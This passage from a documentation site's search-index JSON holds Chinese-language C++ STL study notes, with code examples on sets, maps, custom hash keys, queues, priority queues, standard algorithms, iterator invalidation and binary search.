k)\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u67e5\u627e_1","title":"\u67e5\u627e","text":"<pre><code>if (myset.count(x)) {\n   // x is in the set, count is 1\n} else {\n   // count zero, i.e. x not in the set\n}\n</code></pre> <pre><code>set&lt; X &gt;::iterator it = myset.find(x);\nif (it != myset.end()) {\n   // do something with *it\n}\n</code></pre> <p>c++ 20</p> <pre><code>if (myset.contains(x)) {\n  // x is in the set\n} else {\n  // no x \n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u6c42\u4ea4","title":"\u6c42\u4ea4","text":"<p>\u590d\u6742\u5230\u8fd8\u4e0d\u5982\u4e0d\u7528</p> <pre><code>it=std::set_intersection (first, first+5, second, second+5, v.begin());\nv.resize(it-v.begin());\n</code></pre> <p>c++ - How to find the intersection of two STL sets? - Stack Overflow</p> <p>I would like to understand why such a fundamental operation on sets requires such an arcanely verbose incantation.</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u81ea\u5b9a\u4e49-key-\u7c7b\u578b","title":"\u81ea\u5b9a\u4e49 Key \u7c7b\u578b","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#map","title":"map","text":"<ul> <li>\u6709\u5e8f map\uff0c\u9700\u8981\u81ea\u5b9a\u4e49&lt;\u8fd0\u7b97</li> <li>\u6ce8\u610f\u51fd\u6570\u9700\u8981\u58f0\u660e\u4e3a const</li> </ul> <pre><code>typedef struct Key{\n    char cnt[26];\n    Key(){\n        for(int i=0; i&lt;26; i++){\n            cnt[i] = 0;\n        }\n    }\n    bool operator&lt;(const Key &amp;k2) const{\n        for(int i=0; i&lt;26; i++){\n            if(cnt[i]&lt;k2.cnt[i]){\n                return true;\n            }else if(cnt[i]&gt;k2.cnt[i]){\n                return false;\n            }\n        }\n        return false;\n    }\n}Key;\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#unordered_map","title":"unordered_map","text":"<p>hash - C++ unordered_map using a custom class type as the key - Stack Overflow</p> <ul> <li>\u9700\u8981\u81ea\u5b9a\u4e49\uff1a1\uff09hash \u51fd\u6570\uff0c2\uff09\u91cd\u8f7d<code>==</code>\u8fd0\u7b97</li> <li>\u5b9a\u4e49\u65f6\u9700\u8981\u5728\u6a21\u677f\u53c2\u6570\u4e2d\u5b9a\u4e49 hash \u51fd\u6570\u7684\u7c7b\u578b\uff0c\u5e76\u4e14\u4f20\u9012\u5b9e\u53c2\uff08\u51fd\u6570\u5bf9\u8c61\uff0clambda\uff0c\u51fd\u6570\u540d\uff09</li> </ul> <pre><code>// \u81ea\u5b9a\u4e49\u5bf9 array&lt;int, 26&gt; \u7c7b\u578b\u7684\u54c8\u5e0c\u51fd\u6570\n        auto arrayHash = [fn = hash&lt;int&gt;{}] (const array&lt;int, 26&gt;&amp; arr) -&gt; size_t {\n            return accumulate(arr.begin(), arr.end(), 0u, [&amp;](size_t acc, int num) {\n                return (acc &lt;&lt; 1) ^ fn(num);\n            });\n        };\n\n        unordered_map&lt;array&lt;int, 26&gt;, vector&lt;string&gt;, decltype(arrayHash)&gt; mp(0, arrayHash);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#queue","title":"queue","text":"<ul> <li>\u548c stack \u4e00\u6837\uff0c\u4e5f\u53ea\u6709 push, pop</li> <li>\u4f46\u662f\u53ef\u4ee5\u8bbf\u95ee\u4e24\u5934\u3002front, back\u3002<ul> <li>push \u5bf9\u5e94 back\uff0cpop \u5bf9\u5e94 front\u3002\u8003\u8651\u4e00\u4e2a\u6c34\u5e73\u653e\u7f6e\u7684\u7fbd\u6bdb\u7403\u7b52\uff0c\u4ece\u53f3\u5f80\u5de6\u653e\u5165\u7fbd\u6bdb\u7403\u3002push(back), pop(front)</li> </ul> </li> </ul> <pre><code>front # pop value\nback # push value\npush/emplace\npop\n</code></pre> <p>queues are implemented as\u00a0containers adaptors, which are classes that use an encapsulated object of a specific container class as its\u00a0underlying container</p> <pre><code>template &lt;class T, class Container = deque&lt;T&gt; &gt; class queue;\n</code></pre> <p>\u5e95\u5c42\u5bb9\u5668\u81f3\u5c11\u9700\u8981\u5b9e\u73b0\u4ee5\u4e0b\u65b9\u6cd5</p> <ul> <li>empty</li> <li>size</li> <li>front</li> <li>back</li> <li>push_back</li> <li>pop_front The standard container classes\u00a0deque\u00a0and\u00a0list\u00a0fulfill these requirements</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#list-deque","title":"list, deque","text":"<p><code>std::list</code>\u00a0is a container that supports constant time insertion and removal of elements from anywhere in the container. Fast random access is not supported. It is usually implemented as a doubly-linked list.</p> <p>deque</p> <ul> <li>\u548c vector \u7c7b\u4f3c\uff0c\u652f\u6301\u968f\u673a\u8bfb\u5199\uff0c\u5e76\u4e14\u652f\u6301\u5728\u4e24\u5934\u63d2\u5165\u5220\u9664\u3002</li> <li>\u5e95\u5c42\u4e00\u822c\u4e5f\u662f\u57fa\u4e8e array</li> </ul> <p>While vectors use a single array that needs to be occasionally reallocated for growth, the elements of a deque can be scattered in different chunks of storage, with the container keeping the necessary information internally to provide direct access to any of its elements in constant time and with a uniform sequential interface (through iterators).</p> <p>deque \u53ef\u4ee5\u4fbf\u904d\u5386\uff0c\u4f46\u662f queue \u65e0\u6cd5\u904d\u5386</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5143\u7ec4","title":"\u5143\u7ec4","text":"<ol> <li><code>std::make_tuple</code>: \u6784\u9020\u5143\u7ec4</li> <li><code>std::get</code>: \u83b7\u5f97\u5143\u7ec4\u67d0\u4e2a\u4f4d\u7f6e\u7684\u503c</li> <li><code>std::tie</code>: \u5143\u7ec4\u62c6\u5305</li> </ol> <pre><code>auto student = std::make_tuple(3.8, 'A', \"\u5f20\u4e09\");\n\ncout &lt;&lt; \"\u59d3\u540d\uff1a\" &lt;&lt; std::get&lt;2&gt;(student);\n\ndouble gpa;  \nchar grade;  \nstd::string name;\n // \u5143\u7ec4\u8fdb\u884c\u62c6\u5305\nstd::tie(gpa, grade, name) = get_student(1);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u4f18\u5148\u961f\u5217","title":"\u4f18\u5148\u961f\u5217","text":"<p>\u793a\u4f8b</p> <pre><code>int findKthLargest(vector&lt;int&gt;&amp; nums, int k) {\n        priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt;&gt; max_heap(nums.begin(), nums.end());\n        int ans;\n        for(int i=0; i&lt;k; i++){\n            ans = max_heap.top();max_heap.pop();\n        }\n        return ans;\n    }\n</code></pre> <p>\u6a21\u677f\u7c7b\u5b9a\u4e49</p> <pre><code>template&lt;\n    class T,\n    class Container = std::vector&lt;T&gt;,\n    class Compare = std::less&lt;typename Container::value_type&gt;\n&gt; class priority_queue;\n</code></pre> <p>\u6784\u9020\u51fd\u6570</p> <ul> <li>\u5efa\u5806\u590d\u6742\u5ea6\u4e3a O(3n)</li> <li>algorithm - How is make_heap in C++ implemented to have complexity of 3N? - Stack Overflow</li> <li>The constructor effectively initializes the comparison and container objects and then calls algorithm\u00a0make_heap\u00a0on the range that includes all its elements before returning.</li> <li>\u4e0d\u7406\u89e3\u4e3a\u4ec0\u4e48\u6784\u9020\u51fd\u6570\u4e2d\u8fd8\u8981\u6307\u5b9a comp \u548c ctnr\uff0c\u540e\u9762\u793a\u4f8b\u4e2d\u4e5f\u6ca1\u6709\u4f20\u9012\u8be5\u53c2\u6570\u554a\uff1f<ul> <li>The template parameter is the\u00a0type\u00a0of the comparator. You still need to pass an\u00a0instance\u00a0of the comparator to the priority_queue constructor, and that is when you can construct the comparator instance with whatever parameters you like.Priority Queue of custom Class using Comparator with argument on constructor in C++ - Stack Overflow</li> </ul> </li> </ul> <pre><code>priority_queue (const Compare&amp; comp, const Container&amp; ctnr);\n\ntemplate &lt;class InputIterator&gt;  priority_queue (InputIterator first, InputIterator last,                  const Compare&amp; comp, const Container&amp; ctnr);\n</code></pre> <p>\u793a\u4f8b</p> <pre><code>int myints[]= {10,60,50,20};\n\nstd::priority_queue&lt;int&gt; first;\nstd::priority_queue&lt;int&gt; second (myints,myints+4);\nstd::priority_queue&lt;int, std::vector&lt;int&gt;, std::greater&lt;int&gt; &gt;   #\u4f7f\u7528\u6700\u5c0f\u5806\uff0c\u6307\u5b9agreater\n                          third (myints,myints+4);\n</code></pre> <p>\u81ea\u5b9a\u4e49\u6bd4\u8f83\u51fd\u6570</p> <pre><code>auto cmp = [&amp;](const pair&lt;int, int&gt;&amp; x, const pair&lt;int, int&gt;&amp; y) {\n            return arr[x.first] * arr[y.second] &gt; arr[x.second] * arr[y.first];\n        };\n        priority_queue&lt;pair&lt;int, int&gt;, vector&lt;pair&lt;int, int&gt;&gt;, decltype(cmp)&gt; q(cmp);\n</code></pre> <ul> <li>\u5b9e\u73b0\u4e3a\u5bb9\u5668\u9002\u914d\u5668\uff0c\u5e95\u5c42\u5b9e\u4f8b\u5316\u4e00\u4e2a\u7279\u5b9a\u7684\u5bb9\u5668\u7c7b\u5bf9\u8c61\u3002\u5e95\u5c42\u5bb9\u5668\u53ef\u4ee5\u4f7f\u7528 vector \u548c deque\uff0c\u9ed8\u8ba4\u4e3a vector</li> <li>top + pop<ul> <li>\u603b\u7ed3\uff1a\u4e24\u5934\u7684\u4f7f\u7528 front + push\uff08queue,deque\uff09\u3002\u4e00\u5934\u7684\u4f7f\u7528 top + pop\uff08stack, prority\uff09</li> </ul> </li> </ul> <p>\u5e95\u5c42\u81ea\u52a8\u4f7f\u7528 make_heap</p> <p>The standard container adaptor\u00a0priority_queue\u00a0calls\u00a0make_heap,\u00a0push_heap\u00a0and\u00a0pop_heap\u00a0automatically to maintain\u00a0heap properties\u00a0for a container.</p> <p>\u76f4\u63a5\u4f7f\u7528 make_heap \u63a5\u53e3\u4f8b\u5b50</p> <pre><code>int myints[] = {10,20,30,5,15};\n  std::vector&lt;int&gt; v(myints,myints+5);\n\n  std::make_heap (v.begin(),v.end());\n  std::cout &lt;&lt; \"initial max heap   : \" &lt;&lt; v.front() &lt;&lt; '\\n';\n\n  std::pop_heap (v.begin(),v.end()); v.pop_back();\n  std::cout &lt;&lt; \"max heap after pop : \" &lt;&lt; v.front() &lt;&lt; '\\n';\n\n  v.push_back(99); std::push_heap (v.begin(),v.end());\n  std::cout &lt;&lt; \"max heap after push: \" &lt;&lt; v.front() &lt;&lt; '\\n';\n\n  std::sort_heap (v.begin(),v.end());\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u7f3a\u9677","title":"\u7f3a\u9677","text":"<p>\u65e0\u6cd5\u5224\u65ad\u4e00\u4e2a\u5143\u7d20\u662f\u5426\u4f4d\u4e8e\u4f18\u5148\u961f\u5217\u4e2d</p> <p>\u65e0\u6cd5\u904d\u5386\uff1ac++ - How to iterate over a priority_queue? - Stack Overflow</p> <ul> <li>\u771f\u591f sb \u7684</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u7b97\u6cd5","title":"\u7b97\u6cd5","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u6700\u5927\u6700\u5c0f","title":"\u6700\u5927\u6700\u5c0f","text":"<pre><code>*std::min_element(res.begin(), res.end())\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#find_if","title":"find_if","text":"<p>std::find, std::find_if, std::find_if_not - cppreference.com</p> <pre><code>template&lt;\u00a0class\u00a0InputIt,\u00a0class\u00a0T\u00a0&gt;  \nInputIt find(\u00a0InputIt first, InputIt last,\u00a0const\u00a0T&amp;\u00a0value\u00a0);\n\ntemplate&lt;\u00a0class\u00a0InputIt,\u00a0class\u00a0UnaryPredicate\u00a0&gt;  \nInputIt find_if(\u00a0InputIt first, InputIt last, UnaryPredicate p\u00a0);\n\ntemplate&lt;\u00a0class\u00a0InputIt,\u00a0class\u00a0UnaryPredicate\u00a0&gt;  \nInputIt find_if_not(\u00a0InputIt first, InputIt last, UnaryPredicate q\u00a0);\n</code></pre> <p>\u5b9e\u73b0</p> <pre><code>template&lt;class InputIt, class UnaryPredicate&gt;\nconstexpr InputIt find_if(InputIt first, InputIt last, UnaryPredicate p)\n{\n    for (; first != last; ++first)\n        if (p(*first))\n            return first;\n\u00a0\n    return last;\n}\n</code></pre> <p>\u4f8b\u5b50</p> <pre><code>    int n1 = 3;\n    int n2 = 5;\n    auto is_even = [](int i) { return i % 2 == 0; };\n\u00a0\n    auto result1 = std::find(begin(v), end(v), n1);\n    auto result2 = std::find(begin(v), end(v), n2);\n    auto result3 = std::find_if(begin(v), end(v), is_even);\n\u00a0\n    //check if result == end(v)\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#any_of-none_of","title":"any_of, none_of","text":"<p>std::all_of, std::any_of, std::none_of - cppreference.com</p> <pre><code>template&lt;\u00a0class\u00a0InputIt,\u00a0class\u00a0UnaryPredicate\u00a0&gt;  \nbool\u00a0all_of(\u00a0InputIt first, InputIt last, UnaryPredicate p\u00a0);\n\ntemplate&lt;\u00a0class\u00a0ExecutionPolicy,\u00a0class\u00a0ForwardIt,\u00a0class\u00a0UnaryPredicate\u00a0&gt;  \nbool\u00a0all_of(\u00a0ExecutionPolicy&amp;&amp;\u00a0policy, ForwardIt first, ForwardIt last,  \n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0UnaryPredicate p\u00a0);\n</code></pre> <ul> <li>all_of: Checks if unary predicate\u00a0p\u00a0returns\u00a0true\u00a0for all elements in the range\u00a0<code>[</code>first<code>,</code>\u00a0last<code>)</code>.</li> <li>any_of: Checks if unary predicate\u00a0p\u00a0returns\u00a0true\u00a0for at least one element in the range\u00a0<code>[</code>first<code>,</code>\u00a0last<code>)</code>.</li> <li>none_of: Checks if unary predicate\u00a0p\u00a0returns\u00a0true\u00a0for no elements in the range\u00a0<code>[</code>first<code>,</code>\u00a0last<code>)</code>.</li> </ul> <pre><code>\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#iota","title":"iota","text":"<p>itoa \u662f\u7b2c\u4e5d\u4e2a\u5e0c\u814a\u5b57\u6bcd\u7684\u97f3\u6807\uff0c\u8868\u793a\u5c0f\u5199\u5b57\u6bcd\\(\\iota\\)\uff08\u53ef\u4ee5\u770b latex \u662f\u5982\u4f55\u5199\u7684\uff09</p> <p>\u6e90\u81ea APL \u7f16\u7a0b\u8bed\u8a00\uff0c\u7b26\u53f7 itoa \u8868\u793a\u6574\u6570\u5411\u91cf c++ - What does iota of std::iota stand for? - Stack Overflow</p> <p>The\u00a0interval vector \u2373j(n) is defined as the vector of integers beginning with\u00a0j.</p> <pre><code>template&lt;class ForwardIt, class T&gt;\nconstexpr // since C++20\nvoid iota(ForwardIt first, ForwardIt last, T value)\n{\n    while (first != last)\n    {\n        *first++ = value;\n        ++value;\n    }\n}\n</code></pre> <pre><code>std::iota(l.begin(), l.end(), 0);  //\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#fill","title":"fill","text":"<pre><code>void\u00a0fill(\u00a0ForwardIt first, ForwardIt last,\u00a0const\u00a0T&amp;\u00a0value\u00a0);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u8fed\u4ee3\u5668","title":"\u8fed\u4ee3\u5668","text":"<ul> <li>\u524d\u5411\u8fed\u4ee3\u5668\uff08forward iterator\uff09<ul> <li><code>++p\uff0cp++\uff0c*p</code></li> </ul> </li> <li>\u53cc\u5411\u8fed\u4ee3\u5668\uff08bidirectional iterator\uff09<ul> <li><code>--p, p--</code></li> </ul> </li> <li>\u968f\u673a\u8bbf\u95ee\u8fed\u4ee3\u5668\uff08random access iterator\uff09<ul> <li><code>p+i, p-i, p[i]</code></li> </ul> </li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u8fed\u4ee3\u9002\u914d\u5668","title":"\u8fed\u4ee3\u9002\u914d\u5668","text":"<p>\u53cd\u5411\u8fed\u4ee3\u5668 \u63d2\u5165\u8fed\u4ee3\u5668</p> <p>advance(it, n)\uff1ait \u8868\u793a\u67d0\u4e2a\u8fed\u4ee3\u5668\uff0cn \u4e3a\u6574\u6570\u3002\u8be5\u51fd\u6570\u7684\u529f\u80fd\u662f\u5c06 it \u8fed\u4ee3\u5668\u524d\u8fdb\u6216\u540e\u9000 n \u4e2a\u4f4d\u7f6e\u3002 prev(it)\uff1ait \u4e3a\u6307\u5b9a\u7684\u8fed\u4ee3\u5668\uff0c\u8be5\u51fd\u6570\u9ed8\u8ba4\u53ef\u4ee5\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u4e0a\u4e00\u4e2a\u4f4d\u7f6e\u5904\u7684\u8fed\u4ee3\u5668\u3002\u6ce8\u610f\uff0cit \u81f3\u5c11\u4e3a\u53cc\u5411\u8fed\u4ee3\u5668\u3002 next(it)\uff1at \u4e3a\u6307\u5b9a\u7684\u8fed\u4ee3\u5668\uff0c\u8be5\u51fd\u6570\u9ed8\u8ba4\u53ef\u4ee5\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\u5904\u7684\u8fed\u4ee3\u5668\u3002\u6ce8\u610f\uff0cit \u6700\u5c11\u4e3a\u524d\u5411\u8fed\u4ee3\u5668\u3002 \u6ce8\u610f advance \u4fee\u6539\u539f\u8fed\u4ee3\u5668\uff0cprev,next \u8fd4\u56de\u65b0\u8fed\u4ee3\u5668\u3002</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u8fed\u4ee3\u5668\u5931\u6548\u5904\u7406","title":"\u8fed\u4ee3\u5668\u5931\u6548\u5904\u7406","text":"<p>STL \u5bb9\u5668\u8fed\u4ee3\u5668\u5931\u6548\u60c5\u51b5\u5206\u6790\u3001\u603b\u7ed3 | Ivanzz (ivanzz1001.github.io)</p> <p>vector \u5e95\u5c42\u662f\u8fde\u7eed\u6570\u7ec4\uff0c\u5220\u9664\u67d0\u4e2a\u5143\u7d20\u65f6\uff0c\u9700\u8981\u5bf9\u5143\u7d20\u8fdb\u884c\u79fb\u52a8\uff0c\u6b64\u65f6\u5220\u9664\u5143\u7d20\u540e\u9762\u7684\u8fed\u4ee3\u5668\u5747\u4f1a\u5931\u6548\u3002</p> <ul> <li>\u5f53\u4f7f\u7528\u4e00\u4e2a\u5bb9\u5668\u7684 insert \u6216\u8005 erase \u51fd\u6570\u901a\u8fc7\u8fed\u4ee3\u5668<code>\u63d2\u5165</code>\u6216<code>\u5220\u9664</code>\u5143\u7d20\u53ef\u80fd\u4f1a\u5bfc\u81f4\u8fed\u4ee3\u5668\u5931\u6548\uff0c\u56e0\u6b64\u6211\u4eec\u4e3a\u4e86\u907f\u514d\u5371\u9669\uff0c\u5e94\u8be5\u83b7\u53d6 insert \u6216\u8005 erase \u8fd4\u56de\u7684\u8fed\u4ee3\u5668\uff0c\u4ee5\u4fbf\u7528\u91cd\u65b0\u83b7\u53d6\u7684\u65b0\u7684\u6709\u6548\u7684\u8fed\u4ee3\u5668\u8fdb\u884c\u6b63\u786e\u7684\u64cd\u4f5c</li> <li>\u4ee5\u4e0b\u4ee3\u7801\u5b9e\u73b0\u5bf9\u6392\u5e8f\u7684\u6570\u7ec4\u53bb\u91cd\u3002</li> </ul> <pre><code>int removeDuplicates(vector&lt;int&gt;&amp; nums) {\n        for (auto it = nums.begin()+1; it != nums.end();) {\n            if (*it == *(it - 1)) {\n                it = nums.erase(it);\n            }else{\n                it++;\n            }\n        }\n        return nums.size();\n    }\n</code></pre> <ul> <li>list\uff1aerase \u65f6\u53ea\u6709\u5220\u9664\u7684\u5143\u7d20\u8fed\u4ee3\u5668\u5931\u6548\uff0c\u5176\u4f59\u4ecd\u7136\u6709\u6548\u3002</li> <li>deque\uff1a\u9996\u5c3e\u63d2\u5165\u5220\u9664\u6ca1\u5173\u7cfb\u3002\u4f46\u662f\u4e2d\u95f4\u63d2\u5165\u5220\u9664\u4f7f\u5f97\u6240\u6709\u8fed\u4ee3\u5668\u5931\u6548</li> <li>set, map\uff1a\u4e0d\u5f71\u54cd\u5176\u5b83\u5143\u7d20</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u6742","title":"\u6742","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u8ba1\u65f6","title":"\u8ba1\u65f6","text":"<p>Date and time utilities - cppreference.com</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u95ee\u9898_1","title":"\u95ee\u9898","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u8fed\u4ee3\u5668\u8fb9\u904d\u5386\u8fb9\u5220\u9664","title":"\u8fed\u4ee3\u5668\u8fb9\u904d\u5386\u8fb9\u5220\u9664","text":"<p>c++ - Deleting elements from std::set while iterating - Stack Overflow</p> <pre><code>erase(it);\nit++  //\u9519\u8bef\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a current \u5b58\u50a8\u5f53\u524d\u503c</p> <pre><code>for (auto it = unvisit.begin(); it != unvisit.end();) {\n    auto cur = it++;\n    int y = *cur;\n    if (gcd(x, y) &gt; 1) {\n        s.push(y);\n        unvisit.erase(cur);\n    }\n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5e38\u89c1\u53d6\u6574","title":"\u5e38\u89c1\u53d6\u6574","text":"<ul> <li>std::floor(x)  == (int) ?</li> <li>std::ceil(x) \u5982\u4f55\u5b9e\u73b0<ul> <li>\u5176\u5b9e float \u8f6c int \u662f\u5982\u4f55\u5b9e\u73b0\u7684\u5462\uff1f\u6709\u4e13\u95e8\u6307\u4ee4\u5417\uff1f</li> </ul> </li> </ul> <p>c++ - Ceil function: how can we implement it ourselves? - Stack Overflow</p> <ul> <li>\u6839\u636e IEEE754 \u6807\u51c6\u5b9e\u73b0</li> <li>if(x == (int) x)</li> </ul> <p>\u5b9e\u9645</p> <ul> <li>SSE, AVX \u4e13\u95e8\u7684\u4e00\u7c7b CVT \u6307\u4ee4 https://db.in.tum.de/~finis/x86-intrin-cheatsheet-v2.1.pdf</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#hash-map-\u4f7f\u7528-pair-\u4f5c\u4e3a-key","title":"hash map \u4f7f\u7528 pair \u4f5c\u4e3a key","text":"<p>c++ - Why can't I compile an unordered_map with a pair as key? - Stack Overflow</p> <p>\u5bf9\u4e8e\u975e\u57fa\u672c\u7c7b\u578b key \u7684 hash map\uff0cc++ \u8981\u6c42\u81ea\u5b9a\u4e49 hash \u51fd\u6570</p> <p>\u4e24\u79cd\u65b9\u6cd5\uff1a</p> <ul> <li>wrap \u4e00\u4e2a\u9488\u5bf9\u4e00\u822c pair \u7c7b\u578b\u7684 hash \u51fd\u6570<ul> <li>\u8fd9\u6837\u4e0d\u80fd\u5b8c\u5168\u4fdd\u8bc1 hash \u51fd\u6570\u662f\u6bd4\u8f83\u597d\u7684</li> </ul> </li> </ul> <pre><code>// Only for pairs of std::hash-able types for simplicity.\n// You can of course template this struct to allow other hash functions\nstruct pair_hash {\n    template &lt;class T1, class T2&gt;\n    std::size_t operator () (const std::pair&lt;T1,T2&gt; &amp;p) const {\n        auto h1 = std::hash&lt;T1&gt;{}(p.first);\n        auto h2 = std::hash&lt;T2&gt;{}(p.second);\n\n        // Mainly for demonstration purposes, i.e. works but is overly simple\n        // In the real world, use sth. like boost.hash_combine\n        return h1 ^ h2;  \n    }\n};\n\nunordered_map&lt;pair&lt;int, int&gt;, int, pair_hash&gt; memo; //(S, i) -&gt; #permutation\n</code></pre> <ul> <li>\u81ea\u5df1 wrap \u4e00\u4e2a\u751f\u6210 key \u7684\u51fd\u6570\u3002<ul> <li>\u8fd9\u6837\u4f7f\u7528\u7684\u662f\u7cfb\u7edf\u7684 hash \u51fd\u6570\uff0c\u6548\u679c\u6709\u4fdd\u969c</li> <li>\u9700\u8981\u4fdd\u8bc1\u751f\u6210\u7684 key \u662f\u552f\u4e00\u7684\u3002</li> </ul> </li> </ul> <pre><code>inline size_t get_key(int i, int j) {\n    return (size_t)i &lt;&lt; 32 | (unsigned int)j;\n}\n\nunordered_map&lt;size_t, int&gt; memo;\n\nauto key = get_key(S, prev);\nif(memo.count(key)){\n    return memo[key];\n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5e38\u89c1\u7b97\u6cd5","title":"\u5e38\u89c1\u7b97\u6cd5","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u4e8c\u5206\u67e5\u627e","title":"\u4e8c\u5206\u67e5\u627e","text":"<ul> <li>\u5982\u4e0a\u56fe\uff0c\u5c06\u6570\u7ec4\u67d3\u4e0a\u989c\u8272</li> <li>\u5982\u679c mid \u662f\u84dd\u8272 (&lt;\u6210\u7acb)<ul> <li>\u5bf9\u4e8e\u95ed\u533a\u95f4\u548c\u5de6\u95ed\u53f3\u5f00\uff0cL = mid+1</li> <li>\u5bf9\u4e8e\u5f00\u533a\u95f4\uff0cL = mid</li> </ul> </li> <li>\u5982\u679c mid \u662f\u5176\u5b83<ul> <li>\u5bf9\u4e8e\u95ed\u533a\u95f4\uff0cR = mid - 1</li> <li>\u5bf9\u4e8e\u5f00\u533a\u95f4\u548c\u5de6\u95ed\u53f3\u5f00\uff0cR = mid</li> </ul> </li> </ul> <p>\u5faa\u73af\u4e0d\u53d8\u91cf \u95ed\u533a\u95f4</p> <ul> <li>L - 1 = \u84dd\u8272</li> <li>R + 1 = \u7ea2\u8272</li> <li>\u7ed3\u675f\u65f6 L = R + 1 \u5de6\u95ed\u53f3\u5f00</li> <li>L - 1 = \u84dd\u8272</li> <li>R = \u7ea2\u8272</li> <li>\u7ed3\u675f\u65f6 L = R \u5f00\u533a\u95f4</li> <li>L  = \u84dd\u8272</li> <li>R = \u7ea2\u8272</li> <li>\u7ed3\u675f\u65f6 L = R - 1</li> </ul> <p>\u5de7\u5999\u8f6c\u6362\u6210\u4e8c\u5206\u67e5\u627e\u95ee\u9898\uff1a786. \u7b2c K \u4e2a\u6700\u5c0f\u7684\u7d20\u6570\u5206\u6570 </p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u7b80\u5355\u7c7b\u578b-comp-\u5b9a\u4e49","title":"\u7b80\u5355\u7c7b\u578b comp \u5b9a\u4e49","text":"<p>\u4e09\u79cd\uff1f</p> <ul> <li>\u51fd\u6570\u5bf9\u8c61</li> <li>lambda \u8868\u8fbe\u5f0f</li> <li>\u51fd\u6570\u6307\u9488</li> </ul> <pre><code>upper_bound(nums1_dec.begin(), nums1_dec.end(), x, std::greater&lt;int&gt;());\n\n// std::less\n</code></pre> <p>\u8fd9\u91cc\u7684<code>greater()</code>\u662f\u51fd\u6570\u5bf9\u8c61\uff1aGenerically,\u00a0function objects\u00a0are instances of a class with member function\u00a0operator()\u00a0defined. \u5b9e\u73b0</p> <pre><code>template &lt;class T&gt; struct greater 